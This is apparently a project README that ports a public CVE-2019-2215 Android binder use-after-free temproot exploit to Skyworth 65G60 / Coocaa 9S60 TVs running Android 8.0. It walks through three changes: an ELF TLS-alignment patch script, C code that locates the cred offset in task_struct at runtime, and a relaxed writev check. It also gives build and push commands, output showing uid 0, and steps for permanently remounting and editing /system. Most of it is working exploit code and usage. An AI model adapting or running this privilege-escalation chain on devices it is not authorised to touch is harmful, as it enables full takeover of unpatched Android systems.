# CVE-2019-2215 on Skyworth / Coocaa TVs (9S60, Android 8.0)

Temproot for Skyworth 65G60 (Coocaa 9S60 chassis, MStar MSD6A848) running Android 8.0 / kernel 4.9.44.

This is a port of [LIznzn/CVE-2019-2215](https://github.com/LIznzn/CVE-2019-2215) (Sony Bravia, kernel 4.9.51). That repository was archived in 2020 and its issue tracker is closed, so the three changes needed for this device are documented here instead.

**中文**：这是把 Bravia 那份 CVE-2019-2215 temproot 移植到创维 65G60（酷开 9S60 机芯）的版本。上游仓库已归档、不收 issue，所以把三处必要改动和踩坑记录放在这里。

> Only run this on hardware you own. It gives a temporary root shell; nothing is installed persistently.

## Device

| Item | Value |
|---|---|
| Model | Skyworth 65G60, Coocaa 9S60 chassis, MStar MSD6A848 |
| System | Android 8.0, `full_sky848_9s60`, `ro.build.type=user`, security patch **2017-12-01** |
| Kernel | `Linux 4.9.44+` (built 2022-08), arm64 |
| Userspace | **32-bit** (`ro.zygote=zygote32`, no `/system/bin/linker64`) |
| Other | SELinux **permissive**, `CONFIG_RANDOMIZE_BASE` off (no KASLR), `ro.debuggable=0`, **no dm-verity** |

## Three changes that were needed

### 1. Run a 64-bit static binary on a 32-bit-only userspace

The kernel is arm64, so a **static aarch64 ELF without `PT_INTERP` is executed directly by the kernel** — no `linker64` required. But the NDK's static output is rejected:

```
error: "/data/local/tmp/poc": executable's TLS segment is underaligned:
alignment is 8, needs to be at least 64 for ARM64 Bionic
```

Patch `PT_TLS.p_align` to 64 in the ELF program headers after building:

```python
phoff     = struct.unpack_from('<Q', d, 0x20)[0]   # e_phoff
phentsize = struct.unpack_from('<H', d, 0x36)[0]
phnum     = struct.unpack_from('<H', d, 0x38)[0]
for i in range(phnum):
    o = phoff + i * phentsize
    if struct.unpack_from('<I', d, o)[0] == 7:     # PT_TLS
        struct.pack_into('<Q', d, o + 0x30, 64)    # p_align = 64
```

### 2. `cred` offset differs — detect it at runtime

`offsetof(struct task_struct, cred)` is 1768 on the Bravia kernel; here it is **0x5b8 (1464)**. Reading 1760/1768 yields garbage (`0x1000` / `0`).

Since `real_cred` and `cred` are adjacent and equal, and `cred->uid == getuid()`, the offset can be found at runtime:

```c
for (int off = 8; off < (int)sizeof(struct task_struct) - 16; off += 8) {
    u64 p1 = *(u64 *)(taskbuf + off);
    u64 p2 = *(u64 *)(taskbuf + off + 8);
    if (p1 != p2 || !looks_like_kernel_ptr(p1)) continue;
    u32 uid = 0;
    initial_kernel_read(p1 + offsetof(struct cred, uid), &uid, 4);
    if (uid == (u32)getuid()) { cred_off = off; break; }
}
```

### 3. The `writev` length check is misleading (this cost the most time)

```c
if (writev_ret != iov_len_sum)
    err(1, "writev() returns 0x%lx, expected 0x%lx\n", writev_ret, iov_len_sum);
```

On 4.9.44 `writev_ret` is **always short by exactly `len`** — e.g. `0x21000` instead of `0x21d88` — so the original tool aborts every time inside `find_current`/`patch_creds`. But **the data is actually transferred**; the short return is only an accounting difference.

Downgrading the assertion to a warning makes the whole chain work:

```c
if (writev_ret != iov_len_sum)
    fprintf(stderr, "[!] writev short 0x%lx vs 0x%lx (continue anyway)\n",
            writev_ret, iov_len_sum);
```

## Result

```
current task_struct is at 0xffffffc024ed3000
[+] find kernel address of current task_struct
[*] cred at task+0x5b8 -> 0xffffffc03bd48300
[*] old uid=2000 gid=2000 euid=2000 caps=0
uid=0(root) gid=0(root)
```

`thread_info` layout matches the Bravia one (`flags`, `addr_limit = 0x8000000000`, `task`), and leaking `task->stack` works.

## Build

```sh
$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/<host>/bin/aarch64-linux-android21-clang \
    poc-sky.c -static -O2 -o poc-sky
python3 patch_tls.py poc-sky        # step 1 above
adb push poc-sky /data/local/tmp/
```

## Use

The binary reads commands on stdin and runs them as uid 0:

```sh
cd /data/local/tmp && echo 'id' | ./poc-sky
```

Each run takes 10–30 s (it forks and retries internally). Root exists only inside that process — no `su` is installed.

## What to do with root on this device

The stock system has no dm-verity, so `/system` can be modified permanently:

```sh
SRC=/dev/block/platform/mstar_mci.0/by-name/system
mount -o rw,remount "$SRC" /system        # note: remount,rw fails with "Device or resource busy"
# ... edit /system/pcfg/9S60_G60/config/general_config.xml ...
sync
mount -o ro,remount "$SRC" /system
```

`tools/fix-home.sh` rewrites `DEFAULT_HOMEPAGE` so the TV boots into a third-party launcher (Aerial) natively instead of Coocaa's desktop — on this firmware `CATEGORY_HOME` is ignored, the launcher is started from that config via `persist.service.homepage.pkg/.cls`. Backup the original file first; the script keeps it at `/data/local/tmp/general_config.xml.bak`.

## Known dead ends on this kernel

Clobbering `addr_limit` does **not** give arbitrary kernel read/write: after writing `~0` (verified by read-back), `write(pipe_fd, kernel_addr, n)` still returns `EFAULT`. Every access has to go through the UAF primitives directly.

## Credit

- Original PoC and Bravia offsets: [LIznzn/CVE-2019-2215](https://github.com/LIznzn/CVE-2019-2215)
- Vulnerability: Project Zero [issue 1942](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942), fixed upstream in 2018, still unpatched on this 2017-12 security patch level.
